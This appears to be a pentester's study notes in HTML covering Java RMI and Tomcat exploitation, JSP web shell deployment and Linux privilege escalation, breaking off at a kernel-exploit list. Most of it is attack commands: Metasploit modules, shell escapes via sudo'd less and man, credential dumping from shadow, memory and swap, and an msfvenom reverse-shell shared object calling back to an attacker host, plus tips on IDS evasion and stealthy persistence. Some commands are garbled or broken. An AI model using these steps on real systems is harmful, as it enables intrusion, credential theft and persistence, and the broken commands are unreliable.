+<ul>
+  <li>
+    <p>Java Remote Method Invocation</p>
+  </li>
+  <li>There exists a vulnerability in default configurations of RMI registry and RMI activation services and affects what is known as the <strong>RMI Distributed Garbage Collector</strong>, and essentially allows the loading of arbitrary Java classes from an attacker-defined URL.</li>
+  <li>Usually found on port 1099 TCP</li>
+  <li>in nmap is identified by the <strong>GNU Classpath grmiregistry</strong></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT &lt;target ip&gt; -p 1099 -sV
+</code></pre></div></div>
+
+<p>Alternatively,
+in metasploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/misc/java_rmi_server
+set options, most as default
+run -j
+</code></pre></div></div>
+
+<ul>
+  <li>the SRVHOST and SRVPORT options are essentially what the module use as a web server that the target will use to download the Java payload from.</li>
+  <li>For additional IDs or Endpoint Detection Evasion, you may wanto to set SSL to <strong>true</strong></li>
+  <li>the majority of metasploit is detect, hence the <strong>SSLCert</strong> option which allows you to specify your own custom SSL certificate For the SRVHOST.</li>
+</ul>
+
+<blockquote>
+  <p>[+] General tip
+In regard to metasploit modules and exploits, where possible, always configure a custom SSL certificate For your listeners, etc.
+This goes a long way in evading Intrusion Detection Systems. Metasploit has been around a long time, and defenders have heavily analyzed the source code, and have written detection capabilities For most modules in their default configurations.</p>
+</blockquote>
+
+<ul>
+  <li>We can interact with our session</li>
+  <li>Drop to a shell</li>
+  <li>upgrade the shell with pty.spawn()</li>
+</ul>
+
+<blockquote>
+  <p>[+]
+Sometimes the RMI can be found in non-standard ports, and other ports which the service may require For other reasons.
+That goes For virtually any service</p>
+</blockquote>
+
+<h2 id="exploiting-java-deserialization">Exploiting Java Deserialization</h2>
+<ul>
+  <li>in general, Deserialization of untrusted data.</li>
+  <li>Java-based applications Jboss, WebLogic, WebSphere and Jenkins are affected by this class of vulnerability</li>
+  <li>Serialization itself is a process which allows For applications to convert data into a binary format, which is suitable For saving to disk.</li>
+  <li>In the case of this example, suitable For that data to be transferred over a network and into an application to be then <strong>deserialized</strong> and processed by the application as usable data again.</li>
+</ul>
+
+<p>#</p>
+<ul>
+  <li>This process is vulnerable to the deserialization of untrusted malicious data, which can be supplied by the user, and is ultimately deserialized by an application resulting in code execution without even requiring authentication in most cases.</li>
+  <li>moreover: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</li>
+</ul>
+
+<h3 id="weblogic-serialization-vulnerability">webLogic Serialization Vulnerability</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://web.archive.org/web/20160513025134/http:/www.zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability
+</code></pre></div></div>
+
+<h2 id="exploiting-apache-tomcat">Exploiting Apache Tomcat</h2>
+
+<ul>
+  <li>Used primarily For Java-based web applications.</li>
+  <li>default credentials = https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown</li>
+  <li>Typically found on port 8180 TCP</li>
+</ul>
+
+<h3 id="metasploit">Metasploit</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/http/tomcat_mgr_login
+set options
+set STOP_ON_SUCCESS = true
+run
+</code></pre></div></div>
+
+<ul>
+  <li>after enter in the Tomcat Manager with the credentials we got here</li>
+  <li>there is an area that we can see the deployed applications</li>
+</ul>
+
+<h3 id="laudanum">Laudanum</h3>
+<ul>
+  <li>https://sourceforge.net/projects/laudanum/</li>
+  <li>in kali: /usr/share/laudanum/ - /jsp/</li>
+  <li>the cmd.war application is essentially a java application, which if we can deploy successfully, will allow control of the server, and remote command execution.</li>
+  <li>War file to deploy &gt; browser &gt; select the cmd.war file</li>
+  <li>
+    <p>confirm if the application was deployed &gt; applications &gt;  /cmd</p>
+  </li>
+  <li>if the application deployed correctly, we can browser to it with the following URL:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;target ip&gt;/cmd/cmd.jsp
+</code></pre></div></div>
+
+<p>// we can now execute commands on the system from the JSP Shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd
+</code></pre></div></div>
+
+<blockquote>
+  <p>with the possibility of execute commands in hand, we can get a rev shell etc
+the sky is the limit</p>
+</blockquote>
+
+<h2 id="extra----url-encoding-conversion">Extra [+] - URL encoding conversion</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(space) = +
+(=) = %3d
+( / ) = %2f
+( . ) = %2e
+( aspas ) = %22
+( - ) = %2d
+( : ) = %3a
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 2&gt;/dev/null
+	/usr/bin/nmap
+	nmap --interactive
+	!sh
+	// we have root
+</code></pre></div></div>
+
+<h3 id="druby-rmi-exploit">dRuby RMI Exploit</h3>
+<ul>
+  <li>typically on port TCP 8787</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/linux/misc/drb_remote_codeexec
+set options
+</code></pre></div></div>
+
+<h1 id="post-exploitation">Post-Exploitation</h1>
+
+<p>Goals:
+	- Perform additional information gathering and enumeration of any systems  from a local perspective (shell, console, etc.)
+	- Elevate our privileges
+	- Maintain a foothold
+	- Pivot to other systems 
+	- Utilize methods to exfiltrate data</p>
+
+<p>Categories:
+	- Additional Information Gathering
+	- Privilege Escalation
+	- Lateral Movement
+	- Data Exfiltration
+	- Maintaining Access</p>
+
+<h2 id="priveesc">PrivEesc</h2>
+
+<ul>
+  <li>System and Network Information</li>
+  <li>User Information</li>
+  <li>Privileged Access / Cleartext Credentials</li>
+  <li>Services</li>
+  <li>Jobs / Tasks</li>
+  <li>Installed Software Version Information</li>
+</ul>
+
+<h3 id="system-and-network-information">System and Network Information</h3>
+
+<ul>
+  <li>Hostname
+  Does the hostname reveal anything about the systems function?
+  Can we leverage that information to gain access to function-related information?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostname
+</code></pre></div></div>
+<ul>
+  <li>Kernel Version
+  Is the kernel vulnerable to any exploits?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uname -a
+</code></pre></div></div>
+<ul>
+  <li>Operating System
+  Does our current OS have any known exploitable vulnerabilities?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/issue
+</code></pre></div></div>
+
+<ul>
+  <li>IP address</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig
+</code></pre></div></div>
+
+<ul>
+  <li>Running Processes</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps auxw
+</code></pre></div></div>
+
+<ul>
+  <li>Network Routes
+  Is our currently compromised machine routed to other networks?
+  Can we use this information to pivot?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route -n
+</code></pre></div></div>
+
+<ul>
+  <li>DNS Server
+  Can we obtain information from the DNS server?
+  Active Directory Accounts, Zone Transfer, etc</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/resolv.conf
+</code></pre></div></div>
+
+<ul>
+  <li>Arp Cache
+  Have other machines communicated with another target?
+  Are the other machines accessible from the target?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp -a
+</code></pre></div></div>
+
+<ul>
+  <li>Current Network Connections
+  Are there any established connections from our machine to other machines and vice versa?
+  Are the connections over encrypted or non-encrypted channels?
+  Can we sniff the traffic of those connections?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -auntp
+</code></pre></div></div>
+
+<h3 id="user-information">User Information</h3>
+
+<ul>
+  <li>Current user permissions
+  Can our current user access sensitive information/configuration details that belong to other users?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -user username
+</code></pre></div></div>
+
+<ul>
+  <li>UID and GID Information For all users
+  How many users on the system?
+  What groups do users belong to?
+  Can we modify files belonging to users in other groups?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done
+</code></pre></div></div>
+
+<ul>
+  <li>Last logged on users
+  Whos been on the system?
+  From what systems?
+  Can we pivot to those other systems using credentials we might already have?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>last -a
+</code></pre></div></div>
+
+<ul>
+  <li>Root accounts
+  How many UID 0 (root) accounts are on the system?
+  Can we get credentials For any of them?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
+</code></pre></div></div>
+
+<ul>
+  <li>Service Accounts
+  Do any of the service accounts (i.e, www-data) have shells defined?
+  Can we log in as those accounts?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd
+</code></pre></div></div>
+
+<ul>
+  <li>Home Directories
+  Do we have access to other users home directories?
+  Is any of the information contained in those directories useful to us?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -als /home/*
+</code></pre></div></div>
+
+<h3 id="privileged-access--cleartext-credentials">Privileged Access / ClearText Credentials</h3>
+
+<ul>
+  <li>Can the current user execute anything with elevated privileges?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+<ul>
+  <li>Are there any setuid root (SUID) binaries on the system which may be vulnerable to privilege escalation?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Can we read configuration files that might contain sensitive information, passwords, etc?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep "password" /etc/*.conf 2&gt;/dev/null
+grep -r password /etc/*.conf 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Can we read the shadow file? If so, can we crack any of the hashes?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/shadow
+</code></pre></div></div>
+
+<ul>
+  <li>Can we list or read the contents of the /root directory?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -als /root
+</code></pre></div></div>
+
+<ul>
+  <li>Can we read other users history files?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /* -name *.*history* -print 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Can we write to directories that are configured to server web pages?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>touch /var/www/file
+</code></pre></div></div>
+
+<h3 id="services">Services</h3>
+<ul>
+  <li>Which services are configured on the system and what ports are they opening?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat - auntp
+</code></pre></div></div>
+
+<ul>
+  <li>Are service configuration files readable or modifiable by our current user?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /etc/init.d ! -uid 0 -type f 2&gt;/dev/null | xargs ls -la
+</code></pre></div></div>
+
+<ul>
+  <li>Can we modify the configuration of a service in such a way that gives us elevated privileges?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Edit Service Configuration File
+</code></pre></div></div>
+
+<ul>
+  <li>Do the configuration files contain any information we can use to our advantage? (credentials etc)</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/mysql/my.conf
+</code></pre></div></div>
+
+<ul>
+  <li>Can we stop or start the service as our current user?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service &lt;service name&gt; start/stop
+</code></pre></div></div>
+
+<ul>
+  <li>What actions take place as a result of being able to stop and start services?</li>
+</ul>
+
+<h3 id="jobstasks">Jobs/Tasks</h3>
+<ul>
+  <li>What tasks or jobs is the system configured to run and at which times?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/crontab
+ls -als /etc/cron.*
+</code></pre></div></div>
+
+<ul>
+  <li>Are there any custom jobs or tasks configured as root that world-writable?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
+</code></pre></div></div>
+
+<ul>
+  <li>Can we modify any of the existing tasks at all?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Try and modify cron jobs
+</code></pre></div></div>
+
+<h3 id="installed-software-version-information">Installed Software Version Information</h3>
+<ul>
+  <li>What software packages are installed on the system?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg -l
+</code></pre></div></div>
+
+<ul>
+  <li>What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg -l
+searchsploit "httpd 2.2"
+</code></pre></div></div>
+
+<ul>
+  <li>Does any of the installed software allow us to modify their configuration files and could this result in gaining privileged access to the system?</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Try and modify package configurations
+</code></pre></div></div>
+
+<h3 id="tools">Tools</h3>
+<ul>
+  <li>Much of the information can be gathered through the user of automated tools</li>
+  <li>LinEnum = https://github.com/rebootuser/LinEnum</li>
+</ul>
+
+<h3 id="extra-resources">Extra Resources</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://www.rebootuser.com/?p=1623
+</code></pre></div></div>
+
+<h3 id="netcat-file-transfer">Netcat File Transfer</h3>
+<ul>
+  <li>if wget isnt available or the connectivity to the internet is restricted</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>on target: nc -lp 1234 &gt; LinEnum.sh
+on kali:     nc -w 3 &lt;target ip&gt; 1234 &lt; LinEnum.sh
+</code></pre></div></div>
+
+<blockquote>
+  <p>all traffic is unencrypted and may be detected by Intrusion Detection Systems</p>
+</blockquote>
+
+<h3 id="run-linenum">Run LinEnum</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x LinEnum.sh
+./LinEnum.sh -h
+</code></pre></div></div>
+
+<h3 id="cleartext-credentials-in-configuration-files">Cleartext credentials in configuration files</h3>
+<ul>
+  <li>Find dotfiles files with history in their names (bash_history)</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /* -name *.*history* -print 2&gt;/dev/null
+</code></pre></div></div>
+
+<ul>
+  <li>Grep the apache access.log file For user and pass strings</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /var/log/apache/access.log | grep -E "^user|^pass"
+</code></pre></div></div>
+
+<ul>
+  <li>Dump cleartext Pre-Shared Wireless Keys from Network Manager</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/NetworkManager/system-connections/* | grep -E "^id|^psk"
+</code></pre></div></div>
+
+<p>Command Executions Via User-Defined Functions (UDF)
+	https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</p>
+
+<h3 id="metasploit---get-config-files">Metasploit - get config files</h3>
+<ul>
+  <li>
+    <p>Another way to download configuration files from the target system (assuming we have a shell from metasploit session)
+ → use post/linux/gather/enum_configs</p>
+  </li>
+  <li>
+    <p>Another metasploit module
+ → use post/linux/gather/enum_system</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>There is a lot more in &gt;  /post/linux/</p>
+</blockquote>
+
+<h3 id="suid-binaries">SUID Binaries</h3>
+<ul>
+  <li>There are several other well-known SUID root binaries, as they all require some sort of elevated permissions to perform a function, and some of the most common you will find on linux systems are:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/su
+/bin/mount
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chsh
+</code></pre></div></div>
+
+<h3 id="find-suid-binaries">Find SUID Binaries</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type -f 2&gt;/dev/null
+</code></pre></div></div>
+
+<h3 id="suid-nmap-interactive-mode">SUID Nmap –interactive Mode:</h3>
+<ul>
+  <li>Older versions of Nmap contained an interactive <strong>shell</strong>, which could be launched via the <strong>–interactive</strong> switch</li>
+  <li>Once in interactive mode, and assuming the Nmap executable was SUID root, simply running <strong>!sh</strong> in the interactive Nmap console would land the user a root shell.</li>
+</ul>
+
+<h3 id="glib-origin-expansion-privilege-escalation">glib ‘$ORIGIN’ Expansion Privilege Escalation:</h3>
+<p>metasploit:
+	use exploit/linux/local/glibc_origin_expansion_priv_esc
+moreover: http://seclists.org/fulldisclosure/2010/Oct/257</p>
+
+<h3 id="modify-the-etcsudoers-file">Modify the /etc/sudoers file</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob ALL=(root) NOPASSWD: /bin/less /var/log/*
+bob ALL=(root) NOPASSWD: /bin/less /usr/bin/man
+</code></pre></div></div>
+
+<ul>
+  <li>First lets examine the less program itself:</li>
+  <li>if we take a look at its man entry, we can see that as part of its functionality, it allows a user to execute shell commands (shell escape) with the <strong>!</strong> Shell-Command:</li>
+  <li>this allows users to execute commands from inside less.</li>
+  <li>this will lead to !sh, inside any logs/* directories</li>
+</ul>
+
+<blockquote>
+  <p>Vi/Vim editors also allows breaking out into a shell via the !sh method or executing any shell commands For that matter.</p>
+</blockquote>
+
+<h3 id="list-of-common-executables">List of common executables</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less (!sh)
+more (!sh)
+VI/VIM (:!sh)
+Nmap (--interactive + !sh)
+ftp (!sh)
+gdb
+python
+Perl
+lrb
+lua
+</code></pre></div></div>
+
+<h3 id="man---arbitrary-command-execution-via-pager-argument">Man - Arbitrary Command Execution via Pager Argument</h3>
+<p>-P = pager</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// we can use the -P argument, to run a command that we want.
+man -P "id" man
+
+// if the man is allowed to execute via sudo, we can see the content of the /etc/shadow
+sudo man -P "cat /etc/shadow" man
+</code></pre></div></div>
+
+<h3 id="docker-sudo-privilege-escalation">Docker Sudo Privilege Escalation</h3>
+<ul>
+  <li>docker must be installed in the victim machine</li>
+  <li>must be defined as an entry For a user in the /etc/sudoers file
+// this vuln exploits Docker by compiling shellcode For a root shell within a container, sets the SUID attribute on the resulting exploit binary, and then launches a root shell.
+// moreover = https://github.com/pyperanger/dockerevil</li>
+</ul>
+
+<h3 id="restricted-shells">Restricted Shells</h3>
+<ul>
+  <li>chroot jail = its a way to isolate users and users processes from the rest of the operating system</li>
+  <li>rbash shell - its a common implementation of a restricted shell</li>
+</ul>
+
+<blockquote>
+  <p>rbash when combined with a chroot jail, can be rather effective; however, many times, administrators rely on rbash alone, which opens up several ways we can break out of the restricted shell.</p>
+</blockquote>
+
+<h4 id="some-of-the-commands-that-are-usually-restricted-are">Some of the commands that are usually restricted are:</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>change directories = cd
+specifying absolute path names or files containing a (/) or (-)
+Setting or unsetting the PATH environment variable
+Using ENV or BASH_ENV For setting ot unsetting other environment variables
+Using bash output redirection operators ( '&gt;', '&gt;&gt;', '&gt;|', '&lt;&gt;', '&gt;&amp;', '&amp;&gt;')
+Disabling restricted mode using the "set+r" or "set+o restricted" commands
+</code></pre></div></div>
+
+<h4 id="how-to-identify-that-you-are-in-a-restricted-shell">How to identify that you are in a Restricted Shell</h4>
+<ul>
+  <li>if you try to run a common <strong>cd</strong> to change directory, and a restricted error appears</li>
+  <li>or you are trying to redirect the ouput of a command to a file, and the error appears.</li>
+  <li>we can confirm by running the command <strong>ENV</strong>, specifically the $PATH and $SHELL environment variables</li>
+</ul>
+
+<h4 id="how-to-break-the-restricted-shells">How to break the restricted shells</h4>
+<ul>
+  <li>
+    <p>we can try to use an escape command, like !sh if that binaries are allowed to run</p>
+  </li>
+  <li>
+    <p>with VI/VIM:
+  open a file and then <strong>!sh</strong></p>
+  </li>
+  <li>
+    <p>with find:</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /home/bob -name test -exec /bin/sh \; 
+</code></pre></div></div>
+
+<blockquote>
+  <p>this will only work if the fil test exist in that path. if it does not, search For a known file, or create a file if needed.</p>
+</blockquote>
+
+<ul>
+  <li>with python, Pearl, IRB etc</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/sh")'
+pearl -e 'exec "/bin/sh";'
+</code></pre></div></div>
+
+<ul>
+  <li>with SSH:
+  we can try to break the shell remotely from another system, by trying to execute a shell with SSH before the restricted shell is initialized on the target:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh restricted_user@targetserver -t "/bin/sh"
+</code></pre></div></div>
+
+<p>moreover = https://pentestmonkey.net/blog/rbash-scp</p>
+
+<h3 id="cracking-the-shadow">Cracking the Shadow</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/passwd
+/etc/shadow - are directly manipulated by the /usr/bin/passwd - In current version of Linux, the hashes in the shadow file are stored as **SHA-512**, and can be recognized by the **$6$** at the beginning of the hash. - Older version may be using SHA-256 or MD5 which can be identified by **$5$** and **$1$** respectively - MD5 ($1$) - will be easiest to crack - SHA-256 ($5$) and SHA-512 ($6$) - may be a bit more difficult - In all cases, if the passwordis weak, we can likely crack it regardless of the hashing algorithm.
+</code></pre></div></div>
+
+<h4 id="john-the-ripper">John The Ripper</h4>
+<ul>
+  <li>copy the passwd and shadow file to kali</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd shadow &gt; toJohn
+john toJohn --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<h4 id="mimipenguin">MimiPenguin</h4>
+<ul>
+  <li>if cracking the root or other users password is out of the realm of possibility due to hash strength or any other reason. We can try to obtain from the machines memory using MimiPenguin</li>
+  <li>https://github.com/huntergregal/mimipenguin</li>
+  <li>just like mimikatz from windows</li>
+  <li>Attempts to dumo cleartext credentials from memory from the following applications:
+  GDM password (kali, debian)
+  Gnome keyring (ubuntu, archlinux)
+  VSFTPd (Active FTP connections)
+  Apache2 (Active HTTP Basic Auth Sessions)
+  OpenSSH (Active SSH Sessions - Sudo Usage)</li>
+  <li>There is the <strong>sh</strong> and <strong>py</strong> versions</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./mimipenguin.sh 
+python ./mimipenguin.py
+</code></pre></div></div>
+
+<h4 id="pilfering-credentials-from-swap-memory">Pilfering Credentials From Swap Memory</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swapon -s
+cat /proc/swaps
+</code></pre></div></div>
+
+<ul>
+  <li>We can use the strings command against the partitions.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /dev/sda5 | grep "password="
+string /dev/sda5 | grep "&amp;password="
+</code></pre></div></div>
+
+<p>swap_digger, which can automate searching For common sensitive strings within the swap file:
+	https://github.com/sevagas/swap_digger</p>
+
+<h3 id="code-execution-via-shared-object-library-loading">Code Execution via Shared Object Library Loading</h3>
+<ul>
+  <li>Hijacking Dynamically Linked Shared Object libraries is another method we can use to obtain elevated privileges to a Linux System under certain conditions.</li>
+  <li>Similar to Microsoft Windows Dynamic-Link library (DLL), its the linux Equivalent</li>
+  <li>Providing application with functions that are called from outside of an application by referencing .so files at an applications runtime.</li>
+</ul>
+
+<h4 id="two-primary-types-of-shared-objects-libraries">Two primary types of shared objects libraries</h4>
+<p>1 - Static Libraries (.a) - Code that is compiled into an application
+2 - Dynamically Linked Shared Object libraries (.so) - These can either be linked to the application at runtime or loaded or unloaded and linked during an applications execution.
+// moreover - http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html
+// we will focus in the second one.</p>
+
+<h4 id="when-a-linux-application-is-executed-if-it-uses-shared-objects-is-that-it-will-search-for-those">When a Linux application is executed, if it uses Shared Objects, is that it will search for those:</h4>
+<ol>
+  <li>Any directories specified by -rpath-link options (RPATH)</li>
+  <li>Any directories specified by -rpath options (RPATH)</li>
+  <li>if the -rpath and -rpath-link options are not used, it will then search the contents of the environment variabled LD_RUN_PATH and LD_LIBRARY_PATH</li>
+  <li>Directories defined in the DT_RUNPATH environment variable first, if that does not exist, then the DT_RPATH</li>
+  <li>Then, the default lib directories, normally /lib and /usr/lib</li>
+  <li>Finally, any directories defined in the /etc/ld.so.conf file</li>
+</ol>
+
+<ul>
+  <li>reference - https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html</li>
+</ul>
+
+<h4 id="determine">Determine</h4>
+<ol>
+  <li>Determine the shared objects that are being loaded by an executable</li>
+  <li>Determine if the application was compiled with RPATH or RUNPATH options. If yes, can we write into the locations specified by the either of those options?</li>
+</ol>
+
+<h4 id="determine-the-shared-object-libraries-being-loaded-by-an-executable">Determine the Shared Object Libraries Being loaded by an Executable</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldd /usr/local/bin/program
+</code></pre></div></div>
+
+<p>// what we are looking here, is to see if we can hijack any of the Shared Objects the executable is linking once we have determined if the executable was compiled with RPATH or RUNPATH options.
+// if so, we will be able to drop our payload in the directories defined by either of those options.
+// For that we can use:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump -x /usr/local/bin/program | grep RPATH
+objdump -x /usr/local/bin/program | grep RUNPATH
+</code></pre></div></div>
+
+<ul>
+  <li>if it was compiled with the RPATH or RUNPATH options, the objdump output will be similar to:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RPATH /tmp/program/libs
+RUNPATH /tmp/program/libs
+</code></pre></div></div>
+
+<blockquote>
+  <p>so if we know that the program executable was compiled with RPATH options pointing to /tmp/program/libs, we also know that RPATH is checked For linked Shared Objects before the /lib or /usr/lib directories, we can place our malicious .so file in the /tmp/program/libs directory, and it should be executed whenever the executable is launched.</p>
+</blockquote>
+
+<h4 id="generate-backdoored-shared-object">Generate Backdoored Shared Object</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=&lt;kali ip&gt; LPORT=&lt;kali port&gt; -f elf-so -o program.so
+</code></pre></div></div>
+
+<p>// with the above msfvenom command, we are creating a .so which is the name of one of the shared objects we know the program loads at runtime and using a stageless shell_reverse_tcp payload pointing to our attacker machine and port, where we will also setup a listener with the same payload.</p>
+
+<h4 id="send-the-backdoored-shared-object-to-the-target">Send the backdoored Shared Object to the target</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+cd /tmp/program/libs &amp;&amp; http://&lt;kali ip&gt;/program.so
+</code></pre></div></div>
+
+<h4 id="start-a-handler">Start a handler</h4>
+<p>msf:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set options
+run
+</code></pre></div></div>
+
+<blockquote>
+  <p>[+]
+In order to the privesc work, the program must be executed by a user with higher privileges, or scheduled  as part of a cron job that runs as root. etc</p>
+</blockquote>
+
+<blockquote>
+  <p>or we wait For the program to be launched as a user with elevated privileges or in a luck scenario, the program run as root in the cron job.</p>
+</blockquote>
+
+<ul>
+  <li>we could use social engineering to try and persuade an end-user to execute the program</li>
+  <li>Alternatively, if we are already root on the system, we can use this method as a stealthy persistence mechanism.</li>
+</ul>
+
+<h3 id="kernel-exploits">Kernel Exploits</h3>
+<p>// The kernel is the core of the Linux operating system.
+// since 1991 has grown to support routers, servers, worsktations, firewalls, mobile such as android, even PlayStation.
+// Being open source and with thousands of contributors and users, it makes the kernel a high-value target For zero-days or otherwise more popular and known attack vectors.
+// some recent examples of privesc vulns and associated exploits affecting the Linux kernel:</p>
+<ul>
+  <li>
+    <p>dirty cow - Existed in Kernel versions since 2.6.22 (2007) and fixed in 2016
